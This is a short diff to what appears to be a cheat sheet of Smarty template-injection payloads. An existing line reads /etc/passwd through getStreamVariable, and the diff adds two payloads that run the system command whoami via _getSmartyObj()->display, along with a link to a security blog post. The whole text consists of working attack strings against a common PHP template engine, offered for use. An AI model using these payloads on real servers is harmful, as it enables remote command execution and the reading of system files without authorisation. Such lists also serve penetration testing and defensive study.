@@ -35,8 +35,10 @@ php:
 
 {self::getStreamVariable(“file:///etc/passwd”)}
 
+string:{$smarty.template->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
+string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
 ```
-
+<https://xz.aliyun.com/t/11108?time__1311=Cq0x2DgD0Q3xlEzIx7KD%3Dqi%3DDOU8QUfox#toc-6>
 
 
 
